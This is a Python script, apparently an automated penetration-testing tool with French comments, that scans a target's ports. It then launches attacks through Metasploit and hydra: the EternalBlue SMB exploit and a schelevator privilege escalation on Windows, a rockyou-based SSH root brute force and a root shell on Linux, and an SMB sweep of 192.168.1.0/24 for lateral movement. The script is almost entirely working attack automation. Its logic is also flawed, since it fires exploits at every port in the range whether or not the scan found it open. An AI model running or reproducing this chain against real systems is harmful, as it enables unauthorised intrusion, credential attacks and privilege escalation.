import socket
import threading
import os
from datetime import datetime
import argparse

# Reconnaissance : Scan des ports
def scan_port(ip, port, report_file):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            result_str = f"Port {port} is open on {ip}\n"
            print(result_str)
            write_to_report(report_file, result_str)
        sock.close()
    except Exception as e:
        error_str = f"Error scanning port {port}: {e}\n"
        write_to_report(report_file, error_str)

def port_scanner(ip, port_range, report_file):
    for port in range(port_range[0], port_range[1]):
        thread = threading.Thread(target=scan_port, args=(ip, port, report_file))
        thread.start()

# Exploitation : Automatiser les exploits selon le système d'exploitation et le port découvert
def exploit_service(ip, port, os_type, report_file):
    if os_type == 'Windows':
        if port == 445:
            result_str = f"Exploiting SMB on {ip}:{port} (EternalBlue exploit)\n"
            print(result_str)
            write_to_report(report_file, result_str)
            os.system(f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST {ip}; run'")
            post_exploitation(ip, os_type, report_file)
    elif os_type == 'Linux':
        if port == 22:
            result_str = f"Attempting SSH bruteforce on {ip}:{port}\n"
            print(result_str)
            write_to_report(report_file, result_str)
            os.system(f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{ip}")
            post_exploitation(ip, os_type, report_file)

# Post-exploitation : Automatiser des actions après exploitation réussie
def post_exploitation(ip, os_type, report_file):
    print(f"Performing post-exploitation on {ip}")
    write_to_report(report_file, f"Post-exploitation on {ip}...\n")
    
    if os_type == 'Windows':
        os.system(f"msfconsole -x 'use exploit/windows/local/ms10_092_schelevator; set SESSION 1; run'")
    elif os_type == 'Linux':
        os.system(f"ssh root@{ip} 'sudo -l > sudo_rights.txt; uname -a'")
        os.system(f"ssh root@{ip} 'sudo /bin/sh'") 

# Mouvement Latéral : Scanner le réseau interne et se propager
def lateral_movement(ip, report_file):
    print(f"Attempting lateral movement from {ip}")
    write_to_report(report_file, f"Lateral movement attempt from {ip}...\n")
    os.system(f"msfconsole -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run'")

# Rapport Automatisé : Ecrire les résultats dans un fichier de rapport
def write_to_report(report_file, data):
    with open(report_file, "a") as file:
        file.write(data)

if __name__ == "__main__":
    # Configuration de argparse pour récupérer les arguments de la ligne de commande
    parser = argparse.ArgumentParser(description='Network penetration testing tool')
    parser.add_argument('ip', type=str, help='Target IP address')
    parser.add_argument('start_port', type=int, help='Start port for scanning')
    parser.add_argument('end_port', type=int, help='End port for scanning')
    parser.add_argument('os', type=str, choices=['Windows', 'Linux'], help='Target OS (Windows/Linux)')
    
    args = parser.parse_args()

    target_ip = args.ip
    start_port = args.start_port
    end_port = args.end_port
    os_type = args.os

    # Génération du nom du rapport basé sur l'IP (remplacer / par _) et la date/heure
    report_file = f"pentest_report_{target_ip.replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    print(f"Starting scan on {target_ip} (Ports: {start_port}-{end_port})")
    write_to_report(report_file, f"Starting scan on {target_ip} (Ports: {start_port}-{end_port})...\n")
    
    # Démarrer le scan des ports
    port_scanner(target_ip, (start_port, end_port), report_file)

    # Après le scan, l'outil lancera les exploits selon le résultat
    print(f"\nChecking results and starting exploitation based on open ports...")
    for port in range(start_port, end_port):
        exploit_service(target_ip, port, os_type, report_file)

    # Mouvement latéral si le scan et l'exploitation sont réussis
    lateral_movement_choice = input("Would you like to attempt lateral movement (y/n)? ").strip().lower()
    if lateral_movement_choice == 'y':
        lateral_movement(target_ip, report_file)
